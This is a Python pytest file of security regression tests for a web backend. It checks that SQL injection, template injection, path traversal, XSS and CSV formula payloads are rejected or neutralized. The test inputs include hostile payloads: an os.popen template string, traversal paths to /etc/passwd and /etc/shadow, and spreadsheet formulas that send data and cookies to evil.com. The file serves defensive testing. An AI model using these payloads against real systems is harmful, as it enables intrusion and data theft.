"""
Security Regression Tests — Injection Vectors

Sprint 496: Comprehensive regression coverage for injection attack vectors
against a FastAPI + SQLAlchemy ORM + ReportLab PDF backend.

Categories covered:
1. SQL Injection — SQLAlchemy parameterization holds against metacharacters
2. Template Injection (SSTI) — Jinja2/Python payloads in user data are inert
3. Path Traversal — ../../ sequences rejected in filenames
4. XSS Payload Regression — HTML/script in user fields is not executed
5. CSV Formula Injection (CWE-1236) — Dangerous cell prefixes are neutralized

Test patterns:
- httpx.AsyncClient with ASGITransport for API integration tests
- Direct unit tests for sanitization functions
- conftest.py fixtures: db_session, bypass_csrf, override_auth_verified
"""

import sys

import httpx
import pytest

sys.path.insert(0, "..")

from auth import UserCreate, create_user, require_current_user
from database import get_db
from main import app
from models import User, UserTier
from shared.helpers import safe_download_filename, sanitize_csv_value

# =============================================================================
# FIXTURES
# =============================================================================

TEST_PASSWORD = "SecurePass1!"


@pytest.fixture
def override_db(db_session):
    """Override get_db for unauthenticated endpoints (register/login)."""
    app.dependency_overrides[get_db] = lambda: db_session
    yield
    app.dependency_overrides.clear()


@pytest.fixture
def registered_user(db_session):
    """Create a user with known password for login tests."""
    user_data = UserCreate(email="injection_test@example.com", password=TEST_PASSWORD)
    user = create_user(db_session, user_data)
    return user


@pytest.fixture
def override_auth_current(db_session):
    """Override require_current_user + get_db for authenticated endpoint tests."""
    user = User(
        email="injection_authed@example.com",
        name="Injection Test User",
        hashed_password="$2b$12$fakehashvalue",
        tier=UserTier.PROFESSIONAL,
        is_active=True,
        is_verified=True,
    )
    db_session.add(user)
    db_session.flush()

    app.dependency_overrides[require_current_user] = lambda: user
    app.dependency_overrides[get_db] = lambda: db_session
    yield user
    app.dependency_overrides.clear()


# =============================================================================
# 1. SQL INJECTION REGRESSION
# =============================================================================


@pytest.mark.usefixtures("bypass_csrf")
class TestSQLInjectionRegression:
    """Verify SQLAlchemy ORM parameterization blocks SQL injection in auth endpoints.

    SQLAlchemy uses bound parameters for all queries. These tests confirm that
    SQL metacharacters in user-supplied fields (email, password) do not escape
    the parameter boundary and execute as SQL.
    """

    @pytest.mark.asyncio
    async def test_register_sql_union_in_email(self, override_db):
        """UNION-based injection in email field should be rejected by Pydantic EmailStr."""
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/auth/register",
                json={
                    "email": "test@example.com' UNION SELECT * FROM users--",
                    "password": TEST_PASSWORD,
                },
            )
            # Pydantic EmailStr rejects malformed emails before they reach the DB
            assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_register_sql_drop_table_in_email(self, override_db):
        """DROP TABLE injection in email should be rejected by validation."""
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/auth/register",
                json={
                    "email": "test@example.com; DROP TABLE users;--",
                    "password": TEST_PASSWORD,
                },
            )
            assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_register_sql_or_bypass_in_email(self, override_db):
        """OR '1'='1' tautology in email should be rejected."""
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/auth/register",
                json={
                    "email": "test@example.com' OR '1'='1",
                    "password": TEST_PASSWORD,
                },
            )
            assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_login_sql_metacharacters_in_email(self, override_db):
        """SQL metacharacters in login email should be rejected by Pydantic."""
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/auth/login",
                json={
                    "email": "admin'--",
                    "password": TEST_PASSWORD,
                },
            )
            assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_login_sql_in_password_does_not_bypass_auth(self, override_db, registered_user):
        """SQL injection in password field should not bypass authentication.

        Even if metacharacters somehow passed validation, SQLAlchemy
        parameterizes them, and bcrypt comparison would fail.
        """
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/auth/login",
                json={
                    "email": registered_user.email,
                    "password": "' OR '1'='1'--",
                },
            )
            # Should fail authentication, not bypass it
            assert response.status_code == 401

    @pytest.mark.asyncio
    async def test_login_stacked_queries_in_password(self, override_db, registered_user):
        """Stacked query injection in password should not execute."""
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/auth/login",
                json={
                    "email": registered_user.email,
                    "password": "pass'; DROP TABLE users;--",
                },
            )
            assert response.status_code == 401

    @pytest.mark.asyncio
    async def test_register_with_comment_sequence(self, override_db):
        """SQL comment sequences (--) in email should be blocked by validation."""
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/auth/register",
                json={
                    "email": "admin@example.com'--",
                    "password": TEST_PASSWORD,
                },
            )
            assert response.status_code == 422


# =============================================================================
# 2. TEMPLATE INJECTION (SSTI) REGRESSION
# =============================================================================


class TestTemplateInjectionRegression:
    """Verify that Jinja2/Python template payloads in user-supplied data do not execute.

    The memo generators use ReportLab Paragraph (which accepts a limited HTML
    subset, not Jinja2). These tests ensure that template-like payloads are
    treated as literal text, not interpreted.
    """

    SSTI_PAYLOADS = [
        "{{7*7}}",
        "{{config}}",
        "${7*7}",
        "#{7*7}",
        "{% import os %}{{ os.popen('id').read() }}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]

    @pytest.mark.parametrize("payload", SSTI_PAYLOADS)
    def test_ssti_payload_in_account_name_stays_literal(self, payload):
        """Template expressions in account names should be treated as literal strings.

        sanitize_csv_value (used in exports) should not interpret template syntax.
        The output should contain the literal payload text, not evaluated results.
        """
        result = sanitize_csv_value(payload)
        # The payload starting with = or + would get quote-prefixed for CSV safety,
        # but the template syntax itself must never be evaluated.
        if payload.startswith(("=", "+", "-", "@", "\t", "\r", "|")):
            assert result.startswith("'")
        # The core assertion: "49" (7*7) must not appear if the original was "{{7*7}}"
        if "7*7" in payload:
            assert "49" not in result, "Template expression was evaluated"

    @pytest.mark.parametrize("payload", SSTI_PAYLOADS)
    def test_ssti_payload_in_safe_download_filename(self, payload):
        """Template expressions in filenames should be stripped to safe characters.

        safe_download_filename only allows alnum, '.', '_', '-'.
        Template metacharacters ({, }, %, $, #) must be removed.
        """
        result = safe_download_filename(payload, "Export", "csv")
        assert "{{" not in result
        assert "}}" not in result
        assert "{%" not in result
        assert "${" not in result
        # Must still produce a valid filename
        assert result.endswith(".csv")

    def test_ssti_payload_does_not_leak_config(self):
        """{{config}} in a string field must not expose application configuration."""
        payload = "{{config}}"
        result = str(payload)  # Simulates what _default_format_finding does
        assert "SECRET" not in result.upper()
        assert result == "{{config}}"

    def test_reportlab_paragraph_html_subset_does_not_execute_jinja(self):
        """ReportLab Paragraph interprets a limited HTML subset, not Jinja2.

        Verify that Jinja-like syntax is treated as literal text in the
        Paragraph rendering pipeline (no exception, no evaluation).
        """
        from reportlab.lib.styles import getSampleStyleSheet
        from reportlab.platypus import Paragraph

        styles = getSampleStyleSheet()
        # This should not raise or evaluate the template expression
        para = Paragraph("Account: {{7*7}} balance", styles["Normal"])
        assert para is not None


# =============================================================================
# 3. PATH TRAVERSAL REGRESSION
# =============================================================================


class TestPathTraversalRegression:
    """Verify that directory traversal sequences in filenames are neutralized.

    safe_download_filename strips all characters except alnum, '.', '_', '-'.
    This ensures ../../ sequences cannot escape intended directories.
    """

    PATH_TRAVERSAL_PAYLOADS = [
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\SAM",
        "../../../etc/shadow",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..\\..\\..\\boot.ini",
    ]

    @pytest.mark.parametrize("malicious_name", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_stripped_from_download_filename(self, malicious_name):
        """Path separator characters must be stripped from download filenames.

        safe_download_filename allows only [alnum, '.', '_', '-'], so
        '/' and '\\' are removed entirely. Without path separators, residual
        dots ('..') are harmless — they cannot cause directory traversal in
        a flat filename context.
        """
        result = safe_download_filename(malicious_name, "Export", "xlsx")
        # Critical: no path separators survive sanitization
        assert "/" not in result, f"Forward slash survived in: {result}"
        assert "\\" not in result, f"Backslash survived in: {result}"
        # The result is a valid flat filename with the correct extension
        assert result.endswith(".xlsx")

    def test_null_byte_in_filename_stripped(self):
        """Null byte injection (%00) should be stripped from filenames."""
        result = safe_download_filename("report\x00.xlsx.exe", "Export", "pdf")
        assert "\x00" not in result
        assert result.endswith(".pdf")

    def test_empty_filename_gets_fallback(self):
        """Empty raw name should produce 'Export' fallback, not empty path."""
        result = safe_download_filename("", "TB", "csv")
        assert result.startswith("Export")
        assert result.endswith(".csv")

    def test_only_slashes_leaves_dots_but_no_separators(self):
        """Filename of only traversal sequences should have path separators stripped.

        safe_download_filename keeps '.' in its allowed set (filenames need dots),
        so '../../../../' becomes '........' after stripping '/'. The residual dots
        are harmless as a flat filename — no path separators remain.
        """
        result = safe_download_filename("../../../../", "Memo", "pdf")
        assert "/" not in result
        assert "\\" not in result
        assert result.endswith(".pdf")

    def test_truly_empty_input_gets_fallback(self):
        """Completely empty raw name should produce 'Export' fallback."""
        result = safe_download_filename("", "Memo", "pdf")
        assert result.startswith("Export")
        assert result.endswith(".pdf")

    def test_only_non_filename_chars_gets_fallback(self):
        """Filename with only characters outside [alnum, '.', '_', '-'] gets fallback."""
        result = safe_download_filename("!@#$%^&*()", "Memo", "pdf")
        assert result.startswith("Export")
        assert result.endswith(".pdf")

    @pytest.mark.asyncio
    @pytest.mark.usefixtures("bypass_csrf")
    async def test_upload_with_traversal_filename_does_not_escape(self, override_auth_verified):
        """File upload with path traversal in Content-Disposition filename
        should not write to arbitrary filesystem paths.

        The platform uses Zero-Storage architecture (files are never written
        to disk), but we verify the filename is handled safely in parsing.
        """
        from unittest.mock import AsyncMock

        from shared.helpers import validate_file_size

        mock_file = AsyncMock()
        mock_file.filename = "../../etc/passwd"
        mock_file.content_type = "text/csv"
        content = b"col1,col2\n1,2\n"
        mock_file.read = AsyncMock(side_effect=[content, b""])

        # validate_file_size should process the file without writing to disk
        # The filename with traversal chars is accepted but the file content
        # is returned as bytes, never written to the filesystem
        result = await validate_file_size(mock_file)
        assert result == content


# =============================================================================
# 4. XSS PAYLOAD REGRESSION
# =============================================================================


@pytest.mark.usefixtures("bypass_csrf")
class TestXSSPayloadRegression:
    """Verify that HTML/script payloads in user-provided fields are not executed.

    FastAPI returns JSON responses (Content-Type: application/json), which
    browsers do not render as HTML. These tests verify that payloads are
    returned as inert string data, not interpreted.
    """

    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(document.cookie)</script>',
        "javascript:alert(1)",
        "<svg/onload=alert(1)>",
    ]

    @pytest.mark.asyncio
    async def test_xss_in_register_email_rejected(self, override_db):
        """Script tags in email field should be rejected by EmailStr validation."""
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/auth/register",
                json={
                    "email": "<script>alert(1)</script>@example.com",
                    "password": TEST_PASSWORD,
                },
            )
            assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_xss_in_user_name_returned_as_json_string(self, override_auth_current):
        """XSS payload in user name should be returned as inert JSON string.

        FastAPI serializes to JSON with Content-Type: application/json,
        so HTML is never rendered by the browser.
        """
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.put(
                "/users/me",
                json={"name": "<script>alert('xss')</script>"},
            )
            # Should succeed (name is a plain string field)
            if response.status_code == 200:
                data = response.json()
                # Verify JSON content type prevents browser rendering
                assert response.headers["content-type"].startswith("application/json")
                # The name is stored and returned as literal string, not rendered as HTML
                assert data["name"] == "<script>alert('xss')</script>"

    @pytest.mark.asyncio
    async def test_xss_in_client_name_returned_as_json(self, override_auth_current):
        """XSS payload in client name should be returned as inert JSON string."""
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/clients",
                json={
                    "name": "<img src=x onerror=alert(1)>",
                    "industry": "technology",
                },
            )
            if response.status_code == 201:
                data = response.json()
                assert response.headers["content-type"].startswith("application/json")
                # Returned as literal string data
                assert "<img" in data["name"]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_csv_export_sanitized(self, payload):
        """XSS payloads that also trigger formula injection should be escaped.

        Payloads starting with = or + get quote-prefixed. Others pass through
        as literal strings (CSV format, not HTML).
        """
        result = sanitize_csv_value(payload)
        if payload.startswith(("=", "+", "-", "@", "\t", "\r", "|")):
            assert result.startswith("'")
        # CSV is not rendered as HTML, so the string is safely inert
        assert isinstance(result, str)

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_stripped_from_download_filename(self, payload):
        """XSS payloads in filenames should have HTML metacharacters stripped."""
        result = safe_download_filename(payload, "Export", "pdf")
        assert "<" not in result
        assert ">" not in result
        assert "'" not in result
        assert '"' not in result
        assert result.endswith(".pdf")


# =============================================================================
# 5. CSV FORMULA INJECTION (CWE-1236) — REGRESSION EXPANSION
# =============================================================================


class TestFormulaInjectionRegression:
    """Extended regression tests for CSV formula injection beyond basic coverage.

    CWE-1236: Improper Neutralization of Formula Elements in a CSV File.
    These tests cover advanced attack vectors not in test_upload_validation.py.
    """

    def test_pipe_trigger_escaped(self):
        """Pipe character is a LibreOffice Calc macro trigger (OWASP recommendation)."""
        assert sanitize_csv_value("|cmd") == "'|cmd"

    def test_dde_powershell_payload(self):
        """DDE PowerShell exfiltration payload should be escaped."""
        payload = "=cmd|'/c powershell -ep bypass -e base64payload'!A1"
        result = sanitize_csv_value(payload)
        assert result.startswith("'=")
        assert "cmd" in result

    def test_google_sheets_importdata(self):
        """Google Sheets IMPORTDATA exfiltration should be escaped."""
        payload = '=IMPORTDATA("https://evil.com/steal?data="&A1)'
        result = sanitize_csv_value(payload)
        assert result.startswith("'=")

    def test_hyperlink_formula_injection(self):
        """HYPERLINK formula with data exfiltration should be escaped."""
        payload = '=HYPERLINK("https://evil.com/steal?cookie="&INDIRECT("A1"),"Click")'
        result = sanitize_csv_value(payload)
        assert result.startswith("'=")

    def test_multiline_formula_injection(self):
        """Carriage return followed by formula should be escaped."""
        payload = "\r=cmd|'/c calc'!A1"
        result = sanitize_csv_value(payload)
        assert result.startswith("'")

    def test_tab_prefixed_formula(self):
        """Tab followed by formula should be escaped at the tab level."""
        payload = "\t=1+1"
        result = sanitize_csv_value(payload)
        assert result.startswith("'")

    def test_at_sign_sum_injection(self):
        """@SUM macro should be escaped."""
        assert sanitize_csv_value("@SUM(A1:A100)").startswith("'@")

    def test_boolean_false_value(self):
        """Boolean False should serialize to string, not trigger injection."""
        result = sanitize_csv_value(False)
        assert result == "False"

    def test_float_zero_value(self):
        """Float 0.0 should not trigger formula escaping."""
        result = sanitize_csv_value(0.0)
        assert result == "0.0"

    def test_positive_number_not_escaped(self):
        """Positive numbers should not be escaped (no dangerous prefix)."""
        result = sanitize_csv_value(42)
        assert result == "42"
        assert not result.startswith("'")

    def test_account_name_with_parenthetical_negative(self):
        """Account names like '(1,234.56)' should not be escaped (starts with '(')."""
        result = sanitize_csv_value("(1,234.56)")
        # Parenthesis is not a formula trigger
        assert result == "(1,234.56)"
        assert not result.startswith("'")

    def test_sequential_sanitization_idempotent(self):
        """Double-sanitizing should add at most one prefix quote."""
        original = "=cmd|'/c calc'!A1"
        once = sanitize_csv_value(original)
        twice = sanitize_csv_value(once)
        # First sanitization adds quote prefix
        assert once == "'" + original
        # Second sanitization: ' is not a trigger, so no double-prefix
        assert twice == once
